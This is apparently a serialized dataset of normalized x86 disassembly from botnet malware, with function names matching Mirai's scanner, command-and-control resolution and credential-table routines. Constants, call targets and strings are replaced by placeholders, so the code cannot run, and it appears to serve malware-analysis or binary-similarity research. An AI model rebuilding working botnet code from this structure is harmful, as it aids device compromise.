\nCALL~FOO\nADD~ESP,0\nMOV~EDX,EAX\nMOV~EAX,ESI\nMOV~ECX,EDX\nADD~ESI,0\nCDQ~,\nIDIV~,ECX\nLEA~ECX,[EBX-0]\nMOV~AL,[EBP+EDX+0]\nNOT~EAX\nADD~EDI,EAX\nCMP~ESI,0\nJNZ~FOO\nMOV~EDX,EDI\nMOV~ECX,0\nMOVZX~AX,DL\nXOR~EDX,EDX\nDIV~,CX\nAND~EDX,0\nCALL~[ESP+EDX*4+0]\nPUSH~ECX\nPUSH~ECX\nLEA~ECX,[ESP+0]\nPUSH~ECX\nPUSH~EBP\nCALL~FOO\nMOV~BL,AL\nPOP~EAX\nPOP~EDX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nPOP~EBP\nPOP~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~BL,BL\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nCALL~FOO\nCALL~FOO\nPUSH~EDI\nPUSH~EDI\nPUSH~0\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],0\nJNZ~FOO\nSUB~ESP,0\nMOV~EDX,[ESP+0]\nPUSH~[EDX+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nPUSH~ESI\nPUSH~ESI\nMOV~ECX,[ESP+0]\nPUSH~[ECX+0]\nPUSH~EBX\nCALL~FOO\nPOP~ECX\nMOV~EAX,[ESP+0]\nPUSH~[EAX+0]\nCALL~FOO\nPOP~EBP\nPOP~EDX\nPUSH~EAX\nMOV~EDX,[ESP+0]\nPUSH~[EDX+0]\nCALL~FOO\nADD~ESP,0\nCALL~FOO\nLEA~ESI,[ESP+0]\nMOV~EBX,EAX\nPUSH~EDI\nAND~EBX,0\nPUSH~EDI\nLEA~EBX,<STR>\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+EBX+0],0\nPOP~ECX\nPOP~EBX\nPUSH~ESI\nMOV~ECX,[ESP+0]\nPUSH~DWORDPTR[ECX]\nCALL~FOO\nCALL~FOO\nMOV~ECX,0\nXOR~EDX,EDX\nDIV~,ECX\nPOP~EAX\nLEA~EBX,<STR>\nPOP~EDX\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+EBX+0],0\nPOP~EDI\nPOP~EBP\nPUSH~ESI\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EBX\nPOP~ESI\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~[ESP+0]\nPUSH~EAX\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJG~FOO\nCALL~FOO\nSUB~ESP,0\nPUSH~0\nMOV~EBP,EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nCALL~FOO\nCALL~FOO\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nMOV~EDX,0\nXOR~EAX,EAX\nLEA~EDI,[ESP+0]\nMOV~ECX,EDX\nCLD\nSTOSD~,\nLEA~EDI,[ESP+0]\nMOV~ECX,EDX\nCLD\nSTOSD~,\nMOV~EDX,<STR>\nCMP~EDX,0\nJZ~FOO\nMOV~EAX,EDX\nAND~EDX,0\nSHR~EAX,0\nBTS~[ESP+EAX*4+0],EDX\nCMP~<STR>,0\nJNZ~FOO\nPUSH~ECX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~<STR>,EAX\nCMP~EAX,0\nJZ~FOO\nPUSH~EDX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nPUSH~EAX\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nMOV~EAX,<STR>\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nCALL~EAX\nMOV~<STR>,0\nPUSH~EDI\nPUSH~0\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nCMP~<STR>,0\nMOV~ECX,<STR>\nJZ~FOO\nMOV~EAX,ECX\nAND~ECX,0\nSHR~EAX,0\nBTS~[ESP+EAX*4+0],ECX\nJMP~FOO\nMOV~EAX,ECX\nAND~ECX,0\nSHR~EAX,0\nBTS~[ESP+EAX*4+0],ECX\nMOV~EAX,<STR>\nMOV~EDX,<STR>\nCMP~EDX,EAX\nJGE~FOO\nMOV~EDX,EAX\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[EDX+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nTEST~EAX,EAX\nJNZ~FOO\nMOV~EAX,[ESP+0]\nMOV~EDX,0\nMOV~ECX,EDX\nINC~[ESP+0]\nCDQ~,\nIDIV~,ECX\nMOV~[ESP+0],0\nTEST~EDX,EDX\nJNZ~FOO\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nMOV~ECX,<STR>\nCMP~ECX,0\nJZ~FOO\nMOV~EAX,ECX\nMOV~EDX,ECX\nSHR~EDX,0\nAND~EAX,0\nBT~[ESP+EDX*4+0],EAX\nSETB~AL\nTEST~AL,AL\nJZ~FOO\nLEA~EDX,[ESP+0]\nMOV~[ESP+0],0\nPUSH~ESI\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~EDX\nNEG~EBP\nPUSH~ECX\nCALL~FOO\nCALL~FOO\nCALL~FOO\nCALL~FOO\nPOP~ECX\nPOP~EBX\nPUSH~0\nPUSH~EBP\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nCMP~<STR>,0\nMOV~ECX,<STR>\nJZ~FOO\nMOV~EAX,ECX\nMOV~EDX,ECX\nMOV~<STR>,0\nAND~EAX,0\nSHR~EDX,0\nBT~[ESP+EDX*4+0],EAX\nSETB~AL\nTEST~AL,AL\nJZ~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~ECX\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~<STR>\nCALL~FOO\nMOV~<STR>,0\nCALL~FOO\nMOV~EDX,0\nMOV~ECX,EDX\nXOR~EDX,EDX\nDIV~,ECX\nINC~EDX\nMOV~[ESP],EDX\nCALL~FOO\nJMP~FOO\nSUB~ESP,0\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],AL\nCALL~FOO\nMOV~<STR>,EAX\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~<STR>\nCALL~FOO\nMOV~AL,[ESP+0]\nADD~ESP,0\nTEST~AL,AL\nJZ~FOO\nMOVZX~EAX,AL\nPUSH~0\nPUSH~EAX\nPUSH~EBX\nPUSH~<STR>\nCALL~FOO\nJMP~FOO\nCMP~ECX,0\nJZ~FOO\nMOV~EAX,ECX\nSHR~ECX,0\nAND~EAX,0\nBT~[ESP+ECX*4+0],EAX\nSETB~AL\nTEST~AL,AL\nJZ~FOO\nCALL~FOO\nMOV~EBX,EAX\nMOV~DWORDPTR[EAX],0\nPUSH~0\nPUSH~0\nLEA~EDI,[ESP+0]\nPUSH~EDI\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nTEST~EAX,EAX\nJZ~FOO\nMOV~AX,[ESP+0]\nTEST~AX,AX\nJNZ~FOO\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~<STR>\nCALL~FOO\nJMP~FOO\nROR~AX,0\nCMP~AX,0\nMOV~[ESP+0],AX\nJBE~FOO\nSUB~ESP,0\nPUSH~<STR>\nCALL~FOO\nMOV~<STR>,0\nADD~ESP,0\nMOV~DWORDPTR[EBX],0\nPUSH~0\nMOVZX~EAX,[ESP+0]\nPUSH~EAX\nLEA~ESI,[ESP+0]\nPUSH~ESI\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nMOV~EAX,[EBX]\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJNZ~FOO\nJMP~FOO\nTEST~EAX,EAX\nJNZ~FOO\nCALL~FOO\nJMP~FOO\nPUSH~0\nPUSH~0\nPUSH~EDI\nPUSH~<STR>\nCALL~FOO\nMOV~AX,[ESP+0]\nROR~AX,0\nMOV~[ESP+0],AX\nPUSH~0\nMOVZX~EAX,AX\nPUSH~EAX\nPUSH~ESI\nPUSH~<STR>\nCALL~FOO\nMOV~AX,[ESP+0]\nADD~ESP,0\nTEST~AX,AX\nJZ~FOO\nMOVZX~EAX,AX\nPUSH~EDX\nPUSH~EDX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nJMP~FOO\nADD~ESP,0\nXOR~EAX,EAX\nPOP~ECX\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nLEA~ESP,[ECX-0]\nRETN"'
p95
L2041L
tp96
a(S'resolve_cnc_addr'
p97
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nPOP~ECX\nPOP~EBX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP],EAX\nCALL~FOO\nMOV~ESI,EAX\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nADD~ESP,0\nTEST~ESI,ESI\nJZ~FOO\nMOV~EBX,[ESI+0]\nCALL~FOO\nMOVZX~EDX,BYTEPTR[ESI]\nMOV~ECX,EDX\nXOR~EDX,EDX\nDIV~,ECX\nSUB~ESP,0\nMOV~EAX,[EBX+EDX*4]\nPUSH~ESI\nMOV~<STR>,EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~AX,[EAX]\nMOV~DWORDPTR[ESP],0\nMOV~<STR>,AX\nCALL~FOO\nADD~ESP,0\nPOP~EAX\nPOP~EBX\nPOP~ESI\nRETN"'
p98
L137L
tp99
a(S'rand_next'
p100
S'"MOV~EAX,<STR>\nPUSH~EBX\nMOV~EBX,EAX\nMOV~EDX,<STR>\nSHL~EBX,0\nMOV~ECX,EDX\nSHR~ECX,0\nXOR~EBX,EAX\nMOV~EAX,<STR>\nMOV~<STR>,EAX\nMOV~EAX,<STR>\nMOV~<STR>,EAX\nMOV~<STR>,EDX\nMOV~EAX,EBX\nXOR~EDX,ECX\nSHR~EAX,0\nXOR~EBX,EDX\nXOR~EAX,EBX\nPOP~EBX\nMOV~<STR>,EAX\nRETN"'
p101
L68L
tp102
a(S'rand_str'
p103
S'"PUSH~ESI\nPUSH~EBX\nMOV~ESI,[ESP+0]\nMOV~EBX,[ESP+0]\nJMP~FOO\nCMP~EBX,0\nJLE~FOO\nCALL~FOO\nSUB~EBX,0\nMOV~[ESI],EAX\nADD~ESI,0\nJMP~FOO\nCMP~EBX,0\nJZ~FOO\nCALL~FOO\nSUB~EBX,0\nMOV~[ESI],AX\nADD~ESI,0\nJMP~FOO\nCALL~FOO\nXOR~EBX,EBX\nMOV~[ESI],AL\nINC~ESI\nTEST~EBX,EBX\nJG~FOO\nPOP~EBX\nPOP~ESI\nRETN"'
p104
L70L
tp105
a(S'rand_alphastr'
p106
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nLEA~EAX,[ESP+0]\nMOV~ESI,[ESP+0]\nMOV~EBX,[ESP+0]\nPUSH~EDX\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nCMP~EBX,0\nJBE~FOO\nCALL~FOO\nXOR~EDI,EDI\nMOV~ECX,EAX\nMOV~EDX,ESI\nMOV~AL,CL\nINC~EDI\nSHR~AL,0\nMOVZX~EAX,AL\nSHR~ECX,0\nMOV~AL,[ESP+EAX+0]\nMOV~[EDX],AL\nINC~EDX\nCMP~EDI,0\nJNZ~FOO\nADD~ESI,0\nSUB~EBX,0\nJMP~FOO\nCALL~FOO\nMOV~EDX,0\nMOV~ECX,EDX\nXOR~EDX,EDX\nDIV~,ECX\nMOV~[ESI],DL\nDEC~EBX\nINC~ESI\nTEST~EBX,EBX\nJG~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p107
L116L
tp108
a(S'rand_init'
p109
S'"PUSH~EBX\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~<STR>,EAX\nCALL~FOO\nMOV~EBX,EAX\nCALL~FOO\nXOR~EBX,EAX\nMOV~<STR>,EBX\nCALL~FOO\nMOV~<STR>,EAX\nXOR~EAX,<STR>\nMOV~<STR>,EAX\nADD~ESP,0\nPOP~EBX\nRETN"'
p110
L62L
tp111
a(S'resolv_skip_name'
p112
S'"PUSH~ESI\nMOV~ESI,EDX\nPUSH~EBX\nXOR~EDX,EDX\nMOV~EBX,EAX\nMOV~DWORDPTR[ECX],0\nJMP~FOO\nCMP~AL,0\nJBE~FOO\nMOVZX~EDX,[EBX+0]\nMOVZX~EAX,AL\nSHL~EAX,0\nLEA~EAX,[EAX+EDX-0]\nMOV~EDX,0\nLEA~EBX,[ESI+EAX]\nJMP~FOO\nINC~EBX\nTEST~EDX,EDX\nJNZ~FOO\nINC~DWORDPTR[ECX]\nMOV~AL,[EBX]\nTEST~AL,AL\nJNZ~FOO\nDEC~EDX\nJNZ~FOO\nINC~DWORDPTR[ECX]\nPOP~EBX\nPOP~ESI\nRETN"'
p113
L68L
tp114
a(S'resolv_entries_free'
p115
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nTEST~EBX,EBX\nJZ~FOO\nMOV~EAX,[EBX+0]\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~[ESP+0],EBX\nPOP~ECX\nPOP~EBX\nPOP~EBX\nJMP~FOO\nPOP~EAX\nPOP~EDX\nPOP~EBX\nRETN"'
p116
L47L
tp117
a(S'resolv_domain_to_hostname'
p118
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nXOR~EDI,EDI\nMOV~EBX,[ESP+0]\nMOV~ESI,[ESP+0]\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nLEA~ECX,[EBX+0]\nINC~EAX\nADD~ESP,0\nJMP~FOO\nMOV~DL,[ESI]\nCMP~DL,0\nJZ~FOO\nTEST~DL,DL\nJNZ~FOO\nMOV~EDX,EDI\nXOR~EDI,EDI\nMOV~[EBX],DL\nLEA~EDX,[ECX+0]\nMOV~EBX,ECX\nJMP~FOO\nMOV~[ECX],DL\nINC~EDI\nLEA~EDX,[ECX+0]\nINC~ESI\nDEC~EAX\nMOV~ECX,EDX\nTEST~EAX,EAX\nJG~FOO\nMOV~BYTEPTR[ECX],0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p119
L76L
tp120
a(S'resolv_lookup'
p121
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nPOP~EDX\nPOP~ECX\nPUSH~[ESP+0]\nPUSH~EAX\nCALL~FOO\nPOP~EAX\nPUSH~[ESP+0]\nCALL~FOO\nMOV~EBP,[ESP+0]\nCLD\nADD~EBP,EAX\nLEA~EDI,[ESP+0]\nXOR~EAX,EAX\nSTOSD~,\nSTOSD~,\nSTOSD~,\nSTOSD~,\nPOP~EAX\nLEA~ESI,[EBP+0]\nPUSH~[ESP+0]\nCALL~FOO\nADD~EAX,0\nMOV~[ESP+0],EAX\nCALL~FOO\nMOV~ECX,0\nXOR~EDX,EDX\nDIV~,ECX\nMOV~[ESP+0],DX\nPOP~EDI\nPOP~EAX\nMOV~EBX,EDX\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],BX\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nMOV~[EBP+0],0\nMOV~[ESP+0],0\nMOV~[ESI+0],0\nMOV~EBP,0\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nPUSH~ECX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],EAX\nADD~ESP,0\nINC~EAX\nJZ~FOO\nLEA~EAX,[ESP+0]\nPUSH~EDX\nPUSH~0\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJZ~FOO\nPUSH~0\nPUSH~[ESP+0]\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nINC~EAX\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nPUSH~EAX\nPUSH~0\nPUSH~[ESP+0]\nPUSH~0\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~0\nCALL~FOO\nLEA~EDX,[ESP+0]\nXOR~EAX,EAX\nMOV~ECX,0\nMOV~EDI,EDX\nCLD\nSTOSD~,\nMOV~ESI,[ESP+0]\nMOV~EBX,[ESP+0]\nSHR~ESI,0\nAND~EBX,0\nBTS~[ESP+ESI*4+0],EBX\nMOV~[ESP+0],0\nMOV~[ESP+0],0\nPOP~EAX\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~EDX\nMOV~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nTEST~EAX,EAX\nJZ~FOO\nBT~[ESP+ESI*4+0],EBX\nSETB~AL\nTEST~AL,AL\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~0\nPUSH~0\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nPUSH~[ESP+0]\nMOV~EBX,EAX\nCALL~FOO\nADD~EAX,0\nADD~ESP,0\nCMP~EBX,EAX\nJB~FOO\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],EAX\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nMOV~EDX,[ESP+0]\nADD~ESP,0\nMOV~CX,[ESP+0]\nLEA~EBX,[EDX+EAX+0]\nCMP~[ESP+0],CX\nJNZ~FOO\nMOV~AX,[ESP+0]\nTEST~AX,AX\nJZ~FOO\nMOV~EBP,EAX\nROR~BP,0\nJMP~FOO\nLEA~ECX,[ESP+0]\nLEA~EDX,[ESP+0]\nMOV~EAX,EBX\nMOV~ESI,EBX\nCALL~FOO\nADD~ESI,[ESP+0]\nCMP~WORDPTR[ESI],0\nLEA~EDI,[ESI+0]\nJNZ~FOO\nCMP~[ESI+0],0\nJNZ~FOO\nMOV~AX,[ESI+0]\nROR~AX,0\nCMP~AX,0\nJNZ~FOO\nMOV~AL,[ESI+0]\nMOV~[ESP+0],AL\nMOV~AL,[EDI+0]\nMOV~[ESP+0],AL\nMOV~AL,[EDI+0]\nMOV~[ESP+0],AL\nMOV~AL,[EDI+0]\nMOV~[ESP+0],AL\nPUSH~EAX\nPUSH~EAX\nMOV~EDX,[ESP+0]\nMOVZX~EAX,BYTEPTR[EDX]\nLEA~EAX,<STR>\nPUSH~EAX\nPUSH~[EDX+0]\nCALL~FOO\nMOV~ECX,[ESP+0]\nMOV~DL,[ECX]\nMOVZX~EBX,DL\nMOV~[ECX+0],EAX\nMOV~ECX,[ESP+0]\nMOV~[EAX+EBX*4],ECX\nMOV~EAX,[ESP+0]\nINC~EDX\nADD~ESP,0\nMOV~[EAX],DL\nMOV~AX,[ESI+0]\nROR~AX,0\nMOVZX~EAX,AX\nLEA~EBX,[EDI+EAX]\nJMP~FOO\nLEA~ECX,[ESP+0]\nLEA~EDX,[ESP+0]\nMOV~EAX,EDI\nMOV~EBX,EDI\nCALL~FOO\nADD~EBX,[ESP+0]\nDEC~EBP\nCMP~BP,0\nJNZ~FOO\nJMP~FOO\nCMP~EBP,0\nJZ~FOO\nINC~EBP\nJMP~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nMOV~EDX,[ESP+0]\nCMP~BYTEPTR[EDX],0\nJNZ~FOO\nSUB~ESP,0\nPUSH~EDX\nCALL~FOO\nMOV~[ESP+0],0\nADD~ESP,0\nMOV~EAX,[ESP+0]\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p122
L916L
tp123
a(S'consume_any_prompt'
p124
S'"MOV~ECX,EAX\nMOV~EAX,[EAX+0]\nJMP~FOO\nMOV~DL,[EAX+ECX+0]\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJZ~FOO\nCMP~DL,0\nJNZ~FOO\nINC~EAX\nCMP~EAX,0\nJNZ~FOO\nJMP~FOO\nDEC~EAX\nTEST~EAX,EAX\nJG~FOO\nXOR~EAX,EAX\nRETN"'
p125
L52L
tp126
a(S'can_consume'
p127
S'"ADD~EDX,ECX\nLEA~ECX,[EAX+0]\nADD~ECX,[EAX+0]\nXOR~EAX,EAX\nCMP~EDX,ECX\nSETB~AL\nRETN"'
p128
L16L
tp129
a(S'scanner_kill'
p130
S'"SUB~ESP,0\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nRETN"'
p131
L20L
tp132
a(S'deobf'
p133
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nMOV~ESI,EAX\nSUB~ESP,0\nMOV~EBX,EDX\nPUSH~EAX\nCALL~FOO\nMOV~[EBX],EAX\nINC~EAX\nMOV~[ESP],EAX\nCALL~FOO\nADD~ESP,0\nMOV~EDI,EAX\nMOV~EAX,[EBX]\nINC~EAX\nPUSH~EAX\nPUSH~ESI\nPUSH~EDI\nCALL~FOO\nMOV~EDX,[EBX]\nXOR~EAX,EAX\nADD~ESP,0\nJMP~FOO\nXOR~BYTEPTR[EAX+EDI],0\nINC~EAX\nCMP~EAX,EDX\nJL~FOO\nMOV~EAX,EDI\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p134
L67L
tp135
a(S'add_auth_entry'
p136
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,EAX\nMOV~EAX,<STR>\nMOV~EDI,EDX\nSHL~EAX,0\nMOV~[ESP+0],CX\nADD~EAX,0\nPUSH~EAX\nPUSH~<STR>\nCALL~FOO\nLEA~ESI,[ESP+0]\nMOV~EDX,EAX\nMOV~<STR>,EAX\nMOV~EAX,<STR>\nSHL~EAX,0\nLEA~EBP,[EDX+EAX]\nMOV~EDX,ESI\nMOV~EAX,EBX\nCALL~FOO\nMOV~EDX,<STR>\nMOV~[EBP+0],EAX\nMOV~EAX,<STR>\nSHL~EAX,0\nMOV~ECX,[ESP+0]\nMOV~[EAX+EDX+0],CL\nMOV~EDX,ESI\nMOV~EBX,<STR>\nMOV~EAX,EDI\nSHL~EBX,0\nADD~EBX,<STR>\nCALL~FOO\nMOV~[EBX+0],EAX\nMOV~EAX,<STR>\nMOV~EDX,<STR>\nMOV~ECX,[ESP+0]\nSHL~EAX,0\nMOV~[EAX+EDX+0],CL\nMOV~EDX,<STR>\nMOV~EBX,<STR>\nMOV~ECX,EDX\nMOV~AX,<STR>\nSHL~ECX,0\nINC~EDX\nMOV~<STR>,EDX\nMOV~[ECX+EBX+0],AX\nMOV~AX,<STR>\nADD~AX,[ESP+0]\nMOV~[ECX+EBX+0],AX\nMOV~<STR>,AX\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p137
L209L
tp138
a(S'setup_connection'
p139
S'"PUSH~EDI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,EAX\nCLD\nXOR~EAX,EAX\nLEA~EDI,[ESP+0]\nSTOSD~,\nSTOSD~,\nSTOSD~,\nSTOSD~,\nMOV~EAX,[EBX+0]\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~EDX\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~[EBX+0],EAX\nINC~EAX\nJZ~FOO\nPUSH~EAX\nPUSH~EAX\nLEA~EAX,[EBX+0]\nPUSH~0\nMOV~[EBX+0],0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nPUSH~EAX\nPUSH~0\nPUSH~[EBX+0]\nCALL~FOO\nMOV~EAX,[EBX+0]\nMOV~[ESP+0],EAX\nMOV~EAX,[EBX+0]\nMOV~[ESP+0],AX\nMOV~EAX,<STR>\nMOV~[ESP+0],0\nMOV~[EBX+0],EAX\nLEA~EAX,[ESP+0]\nADD~ESP,0\nMOV~[EBX+0],0\nPUSH~0\nPUSH~EAX\nPUSH~[EBX+0]\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~EDI\nRETN"'
p140
L178L
tp141
a(S'recv_strip_null'
p142
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nPUSH~[ESP+0]\nPUSH~[ESP+0]\nPUSH~EBX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nXOR~EDX,EDX\nTEST~EAX,EAX\nJLE~FOO\nCMP~BYTEPTR[EDX+EBX],0\nJNZ~FOO\nMOV~BYTEPTR[EDX+EBX],0\nINC~EDX\nCMP~EDX,EAX\nJNZ~FOO\nPOP~ECX\nPOP~EBX\nPOP~EBX\nRETN"'
p143
L54L
tp144
a(S'scanner_init'
p145
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nCALL~FOO\nMOV~<STR>,EAX\nTEST~EAX,EAX\nJG~FOO\nINC~EAX\nJZ~FOO\nCALL~FOO\nXOR~EBX,EBX\nMOV~<STR>,EAX\nCALL~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nMOV~<STR>,EAX\nPOP~EAX\nPOP~EDX\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~[ESP+0],0\nMOV~ECX,EAX\nMOV~<STR>,EAX\nADD~ESP,0\nXOR~EAX,EAX\nLEA~EDX,[ECX+0]\nIMUL~EAX,,0\nINC~EBX\nMOV~DWORDPTR[EDX],0\nMOV~[EAX+ECX+0],0\nADD~EDX,0\nMOV~EAX,EBX\nCMP~EBX,0\nJLE~FOO\nMOV~[ESP+0],0\nPUSH~EBP\nPUSH~0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nMOV~<STR>,EAX\nCMP~EAX,0\nJZ~FOO\nPUSH~EDI\nPUSH~0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nOR~AH,0\nPUSH~EAX\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nLEA~EAX,[ESP+0]\nMOV~[ESP+0],0\nMOV~DWORDPTR[ESP],0\nPUSH~EAX\nPUSH~0\nPUSH~0\nPUSH~<STR>\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~<STR>\nCALL~FOO\nPOP~ESI\nPUSH~0\nCALL~FOO\nCALL~FOO\nMOV~EBX,EAX\nMOV~[ESP+0],AX\nROR~AX,0\nCMP~AX,0\nJBE~FOO\nMOV~<STR>,0\nMOV~<STR>,0\nCALL~FOO\nMOV~<STR>,0\nMOV~<STR>,AX\nMOV~AL,<STR>\nAND~EAX,0\nMOV~<STR>,0\nOR~EAX,0\nMOV~<STR>,0\nMOV~<STR>,BX\nMOV~<STR>,AL\nCALL~FOO\nMOV~ECX,0\nMOV~<STR>,AX\nMOV~EDX,0\nMOV~EAX,0\nOR~<STR>,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~EDX,0\nMOV~EAX,EDX\nMOV~ECX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~FOO\nMOV~ECX,0\nMOV~EDX,0\nMOV~EAX,0\nCALL~F